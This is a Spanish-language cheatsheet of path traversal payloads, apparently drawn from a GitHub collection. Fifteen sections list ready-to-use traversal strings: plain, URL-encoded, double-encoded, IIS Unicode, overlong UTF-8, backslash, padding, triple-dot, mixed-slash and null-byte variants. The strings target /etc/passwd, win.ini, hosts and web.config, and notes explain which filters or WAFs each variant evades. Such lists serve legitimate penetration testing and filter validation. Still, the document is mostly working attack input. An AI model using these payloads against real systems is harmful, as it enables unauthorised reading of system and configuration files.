# Catálogo de Payloads — Path Traversal
# Fuente: https://github.com/hackingyseguridad/directoriotraversal

## Tabla de contenidos
1. [Básicos Unix](#1-básicos-unix)
2. [URL encoding simple (%2f)](#2-url-encoding-simple-2f)
3. [Double URL encoding (%252f)](#3-double-url-encoding-252f)
4. [Encoding del punto (%2e)](#4-encoding-del-punto-2e)
5. [Backslash Windows](#5-backslash-windows)
6. [Backslash URL-encoded (%5c / %255c)](#6-backslash-url-encoded-5c--255c)
7. [Unicode IIS bypass (%u2215)](#7-unicode-iis-bypass-u2215)
8. [UTF-8 Overlong encoding (%c0%af)](#8-utf-8-overlong-encoding-c0af)
9. [Double-encoded UTF-8 (%25c0%25af)](#9-double-encoded-utf-8-25c025af)
10. [Codificación %c1%9c (backslash)](#10-codificación-c19c-backslash)
11. [Doble porcentaje %%32%66](#11-doble-porcentaje-3266)
12. [Buffer padding con AAAA...](#12-buffer-padding-con-aaaa)
13. [Triple dot y variantes](#13-triple-dot-y-variantes)
14. [Mixed slash](#14-mixed-slash)
15. [Null byte (legacy)](#15-null-byte-legacy)

---

## 1. Básicos Unix

El más simple, funciona cuando no hay ningún filtro.

```
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
```

---

## 2. URL encoding simple (%2f = `/`)

Útil cuando el servidor decodifica una vez antes de procesar.

```
..%2fetc/passwd
..%2f..%2fetc/passwd
..%2f..%2f..%2fetc/passwd
..%2f..%2f..%2f..%2fetc/passwd
..%2f..%2f..%2f..%2f..%2fetc/passwd
```

Variante con `.` también encodado (`%2e` = `.`):

```
%2e%2e/etc/passwd
%2e%2e/%2e%2e/etc/passwd
%2e%2e%2fetc/passwd
%2e%2e%2f%2e%2e%2fetc/passwd
```

---

## 3. Double URL encoding (%252f = `%2f`)

Para cuando la aplicación decodifica dos veces o hay un WAF que solo hace una pasada.

```
..%252fetc/passwd
..%252f..%252fetc/passwd
..%252f..%252f..%252fetc/passwd
..%252f..%252f..%252f..%252fetc/passwd
%252e%252e/etc/passwd
%252e%252e%252fetc/passwd
%252e%252e%252f%252e%252e%252fetc/passwd
```

---

## 4. Encoding del punto (%2e)

Cuando se filtra `..` pero no `%2e%2e`:

```
%2e%2e/etc/passwd
%2e%2e/%2e%2e/etc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e%2fetc/passwd
%2e%2e%2f%2e%2e%2fetc/passwd
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

---

## 5. Backslash Windows

En servidores IIS / Windows donde `\` es separador de path:

```
..\etc/passwd
..\..\etc/passwd
..\..\..\etc/passwd
..\..\..\..\etc/passwd
..\..\..\..\..\etc/passwd
..\..\..\..\..\..\etc/passwd
```

Path completo Windows:

```
..\windows\win.ini
..\..\windows\system32\drivers\etc\hosts
..\..\..\inetpub\wwwroot\web.config
```

---

## 6. Backslash URL-encoded (%5c / %255c)

```
..%5cetc/passwd
..%5c..%5cetc/passwd
..%5c..%5c..%5cetc/passwd
..%255cetc/passwd
..%255c..%255cetc/passwd
..%255c..%255c..%255cetc/passwd
%2e%2e%5cetc/passwd
%2e%2e%5c%2e%2e%5cetc/passwd
%252e%252e%255cetc/passwd
```

---

## 7. Unicode IIS bypass (%u2215)

Específico de IIS con soporte Unicode activado (`%u2215` = `/`, `%u2216` = `\`):

```
..%u2215etc/passwd
..%u2215..%u2215etc/passwd
..%u2215..%u2215..%u2215etc/passwd
..%u2215..%u2215..%u2215..%u2215etc/passwd
%uff0e%uff0e/etc/passwd              # fullwidth dot
%uff0e%uff0e%u2215etc/passwd
..%u2216etc/passwd                   # backslash unicode
..%uEFC8etc/passwd
..%uF025etc/passwd
```

---

## 8. UTF-8 Overlong encoding (%c0%af)

Bypass de filtros que no manejan UTF-8 malformado (`%c0%af` = `/` en overlong UTF-8):

```
..%c0%afetc/passwd
..%c0%af..%c0%afetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
%c0%ae%c0%ae/etc/passwd              # overlong dot
%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae%c0%afetc/passwd
%c0%ae%c0%ae%c1%9cetc/passwd
..%c1%9cetc/passwd                   # overlong backslash
```

---

## 9. Double-encoded UTF-8 (%25c0%25af)

Combinación de double-encoding + overlong:

```
..%25c0%25afetc/passwd
..%25c0%25af..%25c0%25afetc/passwd
..%25c0%25af..%25c0%25af..%25c0%25afetc/passwd
%25c0%25ae%25c0%25ae/etc/passwd
%25c0%25ae%25c0%25ae%25c0%25afetc/passwd
```

---

## 10. Codificación %c1%9c (backslash)

```
..%c1%9cetc/passwd
..%c1%9c..%c1%9cetc/passwd
..%c1%9c..%c1%9c..%c1%9cetc/passwd
%c0%ae%c0%ae%c1%9cetc/passwd
```

---

## 11. Doble porcentaje %%32%66

Bypass de algunos parsers de CGI:

```
..%%32%66etc/passwd
..%%32%66..%%32%66etc/passwd
%%32%65%%32%65/etc/passwd            # %% = %
%%32%65%%32%65%%32%66etc/passwd
..%%35%63etc/passwd                  # %%35%63 = backslash
%%32%65%%32%65%%35%63etc/passwd
```

---

## 12. Buffer padding con AAAA...

Bypass de validaciones que truncan el path a N caracteres antes de comprobar:

```
/AAAA[x1000]/../etc/passwd
/AAAA[x1000]/../../etc/passwd
/AAAA[x1000]/../../../etc/passwd
/AAAA[x260]/../etc/passwd
/AAAA[x260]/../../etc/passwd
```

Generar en bash:
```bash
python3 -c "print('/'+('A'*1024)+'/../etc/passwd')"
```

---

## 13. Triple dot y variantes

Para sistemas que filtran `..` pero permiten `...`:

```
.../etc/passwd
.../.../etc/passwd
.../.../.../etc/passwd
...\etc/passwd
...\...\etc/passwd
..../etc/passwd
..../..../etc/passwd
....\etc/passwd
```

---

## 14. Mixed slash

Combinaciones de slash y backslash para confundir parsers:

```
/\../etc/passwd
/\../\../etc/passwd
/\../\../\../etc/passwd
//..\etc/passwd
//..\/..\etc/passwd
```

---

## 15. Null byte (legacy)

En lenguajes C/PHP < 5.3.4, el null byte `%00` termina el string y puede bypassear
extensiones forzadas como `.php`:

```
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg
../../../../etc/passwd%2500
```

> ⚠️ Solo funciona en versiones muy antiguas de PHP (< 5.3.4) o aplicaciones C/C++.

---

## Referencia rápida — Cheatsheet de encodings

| Carácter | Raw | %enc | %%enc | Overlong UTF-8 | Unicode IIS |
|----------|-----|------|-------|----------------|-------------|
| `/` | `/` | `%2f` | `%252f` | `%c0%af` | `%u2215` |
| `\` | `\` | `%5c` | `%255c` | `%c1%9c` | `%u2216` |
| `.` | `.` | `%2e` | `%252e` | `%c0%ae` | `%uff0e` |
| `..` | `..` | `%2e%2e` | `%252e%252e` | `%c0%ae%c0%ae` | `%uff0e%uff0e` |
| `../` | `../` | `%2e%2e%2f` | `%252e%252e%252f` | — | — |

